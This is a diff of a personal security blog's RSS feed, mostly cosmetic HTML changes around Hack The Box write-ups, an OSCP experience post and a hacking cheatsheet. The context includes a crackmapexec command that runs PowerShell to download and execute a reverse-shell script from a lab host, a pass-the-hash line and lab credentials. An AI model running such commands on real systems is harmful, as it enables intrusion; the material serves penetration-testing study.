+<li>A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK <a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101">https://www.youtube.com/watch?v=aSiIHKeN3ys&t=26s&pbjreload=101</a></li>
 <li>GitHub Recon and Sensitive Data Exposure <a href="https://youtu.be/l0YsEk_59fQ">https://youtu.be/l0YsEk_59fQ</a></li>
 <li>Cracking the Lens: Targeting HTTP&rsquo;s Hidden Attack-Surface <a href="https://www.youtube.com/watch?v=zP4b3pw94s0">https://www.youtube.com/watch?v=zP4b3pw94s0</a></li>
 <li>How to Crush Bug Bounties in the first 12 Months <a href="https://www.youtube.com/watch?v=AbebbJ3cRLI">https://www.youtube.com/watch?v=AbebbJ3cRLI</a></li>
@@ -879,8 +1168,10 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li>Will Dormann: <a href="https://twitter.com/wdormann">https://twitter.com/wdormann</a></li>
 <li>Scott Piper: <a href="https://twitter.com/0xdabbad00">https://twitter.com/0xdabbad00</a></li>
 </ul>
-]]></content></item><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid><description>Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
-I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.</description><content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid><description>&lt;img src="https://ceso.github.io/images/htb/obscurity/info-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">you can click here to go to it&lt;/a>&lt;/p>
+&lt;p>I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/htb/obscurity/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -1097,7 +1388,7 @@ I run gobuster against the server, but no luck, it didn&rsquo;t find any directo
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Response</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, <span style="color:#f92672">**</span>kwargs):
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>update(kwargs)
 </span></span><span style="display:flex;"><span>        now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>dateSent <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> now<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%a</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S&#34;</span>)
@@ -1105,7 +1396,7 @@ I run gobuster against the server, but no luck, it didn&rsquo;t find any directo
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> respTemplate<span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>__dict__)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, request):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, request):
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>good <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
 </span></span><span style="display:flex;"><span>            request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
@@ -1131,7 +1422,7 @@ I run gobuster against the server, but no luck, it didn&rsquo;t find any directo
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Server</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, host, port):    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, host, port):    
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> host
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>port <span style="color:#f92672">=</span> port
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
@@ -1516,8 +1807,10 @@ Then we proceed to execute the script with <code>out.txt</code> as input and <co
 </span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
 </span></span></code></pre></div><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
 <p>I will try to be making some time to do write ups of some other machines, until next time!!</p>
-]]></content></item><item><title>A Journey in the Dark - An adventure's tale towards OSCP</title><link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid><description>Preface This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.
-Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</description><content type="html"><![CDATA[
+]]></content></item><item><title>A Journey in the Dark - An adventure's tale towards OSCP</title><link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid><description>&lt;img src="https://ceso.github.io/images/blog/oscp/oscp_banner.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="preface">Preface&lt;/h2>
+&lt;p>This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.&lt;/p>
+&lt;p>Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/blog/oscp/oscp_banner.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -1576,10 +1869,9 @@ For the report itself, I gave me more freedom with it, the aim yes, was to do so
 <p>Something important to remark, the windows machine I used to the development of the exploit (BOF) was a free one provided by Microsoft that has a valid time of 3 months, so more than enough for this, it can be downloaded here:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
 </span></span></code></pre></div><p>Finally, the 2020/04/11 I started doing a livestream on youtube, and ended rooting all the machines in around 14 hs. <strong>Worth to mention I cut the live stream at around those 14 hs, but youtube only uploaded 12 hs of video, this also was the first time I was streaming something and I didn&rsquo;t know OBS by default didn&rsquo;t do a recording of the videos while streaming, so I don&rsquo;t have the original video to upload the 2 hs missing, but if wanted I just can record that missing parts</strong>, said that, the streaming:</p>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/FwZc6JigIcE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/FwZc6JigIcE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h4 id="01---note-taking">01 - Note Taking</h4>
 <p>When I started my notes were pure shit, I&rsquo;m sure they still are, but are way better than what they were before. For taking/keeping notes through all the PWK and OSCP, I used Cherrytree, I started with <a href="https://411hall.github.io/assets/files/CTF_template.ctb">this template</a>, but as I moved forward and my own methodology started to develop I modified some stuff, the result was having this template:</p>
@@ -1591,10 +1883,9 @@ For that I ended using the <a href="https://github.com/noraj/OSCP-Exam-Report-Te
 Keep in mind that this has some <em>HEAVY</em> requirements when it comes to packages, you need to install around 5 GB and I was too lazy to be honest for figuring out exactly which what packages were needed.
 In summary you need to install <a href="https://pandoc.org/installing.html">pandoc</a>, <a href="https://github.com/Wandmalfarbe/pandoc-latex-template#required-latex-packages">LaTeX</a> and the <a href="https://github.com/Wandmalfarbe/pandoc-latex-template/blob/master/eisvogel.tex">Eisvogel template</a>. Having that done is just a matter of edition with your favourite text editor, I used VS Code.
 If you want to read a bit more in deep about this, I recommend you to read <a href="https://www.tagnull.de/post/oscp-reporting/">this post by 0x41</a>, or watch the following video by John Hammond talking about this subject:</p>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/MQGozZzHUwQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/MQGozZzHUwQ?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <p>This is the PDF report of the simulation done at the Live Streaming on Youtube:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.pdf
@@ -1629,8 +1920,11 @@ Don&rsquo;t think of &ldquo;Try Harder&rdquo; as you need to exprime more your b
 Take rests, eat, be aware what you are lacking on your documentation and what is excessing, learn to be self-aware of your weakness (mind SQLI and Windows).</p>
 <p><strong>But again most important: Keep trying harder!!</strong></p>
 <p><em>Note: Please let me know any fix needed on the text or whatever, it also helps to keep improving my english :P</em></p>
-]]></content></item><item><title>Hacking Cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking-cheatsheet/</guid><description>Hacking Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
-Edit 2021/11: I&amp;rsquo;m going through OSEP challenges and as so, Im updating this with stuff Im using there because I kept forgetting commands often</description><content type="html"><![CDATA[<h1 id="hacking-cheatsheet">Hacking Cheatsheet</h1>
+]]></content></item><item><title>Hacking Cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking-cheatsheet/</guid><description>&lt;h1 id="hacking-cheatsheet">Hacking Cheatsheet&lt;/h1>
+&lt;p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
+But this is basically the tools I tend to relie and use in this way the most.
+Hope is helpfull for you!&lt;/p>
+&lt;p>Edit 2021/11: I&amp;rsquo;m going through OSEP challenges and as so, Im updating this with stuff Im using there because I kept forgetting commands often&lt;/p></description><content type="html"><![CDATA[<h1 id="hacking-cheatsheet">Hacking Cheatsheet</h1>
 <p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
 But this is basically the tools I tend to relie and use in this way the most.
 Hope is helpfull for you!</p>
@@ -1742,7 +2036,7 @@ Hope is helpfull for you!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>crackmapexec smb 172.16.21.22 -d example.com -u cuartirolo -H 09238831b1af5edab93c773f56409d96 -x &#34;whoami&#34;
 </span></span></code></pre></div><p>With password</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>smb 172.16.21.22 -u administrator -p fn89hudi1892r -x &#34;powershell.exe IEX(New-Object Net.Webclient).downloadString(&#39;http://192.168.42.42/dameelreversooo.ps1&#39;)&#34;
-</span></span></code></pre></div><h4 id="heading"></h4>
+</span></span></code></pre></div><h4></h4>
 <h4 id="version-nmap-didnt-detect-it">Version (nmap didn&rsquo;t detect it)</h4>
 <p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.</p>
 
@@ -2301,8 +2595,11 @@ This one is complex than the Unconstrained/Constrained.</p>
 <li>2 - Computer/User account which has GenericWrite to another computer account in the domain, can be leveraged to add the account compromised to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target and afterwards impersonate ANY user account.</li>
 <li>3 - We don&rsquo;t have credentials, but we can get to relay a hash with responder/impacket-ntlmrelayx/mitm6 to LDAP and create a new computer account and add it to the msDS-AllowedToActOnBehalfOfOtherIdentity property. Later on impersonate any user.</li>
 </ul>
-]]></content></item><item><title>Hack The Box - AI</title><link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid><description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
-This was a box where for the foothold, you needed to upload a .</description><content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - AI</title><link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid><description>&lt;img src="https://ceso.github.io/images/htb/ai/info-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
+At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.&lt;/p>
+&lt;p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit &lt;a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JWDP&lt;/a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different &lt;a href="https://en.wikipedia.org/wiki/Speech_synthesis">TTS&lt;/a> I didn&amp;rsquo;t like it, in summary, was a box I didn&amp;rsquo;t feel like learning something new at all.&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -2520,7 +2817,9 @@ passwd: H,Sq9t6}a&lt;)?q93_
 </span></span><span style="display:flex;"><span>33 /root/root.txt
 </span></span></code></pre></div><p>Done, we have root access and the root.txt flag :D.</p>
 <p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
-]]></content></item><item><title>Hack The Box - Bitlab</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid><description>Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</description><content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Bitlab</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid><description>&lt;img src="https://ceso.github.io/images/htb/bitlab/info-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the &lt;code>sudo + git&lt;/code> path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -2755,7 +3054,10 @@ We run the listener for our reverse shell and execute it, with it having our rce
 </span></span></code></pre></div><p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p>
 <p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p>
 <p>Until nex write up!</p>
-]]></content></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid><description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description><content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid><description>&lt;img src="https://ceso.github.io/images/htb/craft/info-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>So!!
+Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot &lt;a href="https://www.hackthebox.eu/profile/103596">@Fugl!&lt;/a>), root was easy by a little bit of enumeration and reading help command output.&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -3200,8 +3502,9 @@ We check what options vault provides to use it:</p>
 </span></span></code></pre></div><p>And we own root!!
 Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
 <p>Thanks a lot for reading, and until the next write-up.</p>
-]]></content></item><item><title>shutdown -r now</title><link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link><pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid><description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
-I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;rdquo;, currently that mindset has been changing.</description><content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
+]]></content></item><item><title>shutdown -r now</title><link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link><pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid><description>&lt;p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.&lt;/p>
+&lt;p>I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people
+who blogs!&amp;rdquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&amp;hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.&lt;/p></description><content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
 <p>I have always been thinking about writing a blog, but my mindset has always been the same &ldquo;me? a blog? what am I supposed to post! I can&rsquo;t even think anything I could share with people, I don&rsquo;t know nothing compared to the people
 who blogs!&rdquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.</p>
 <p>I consider I started into IT being really old; with 18 I got my first Linux Sysadmin Job while with 9-12 years some children were playing with code, trying to break stuff, etc.
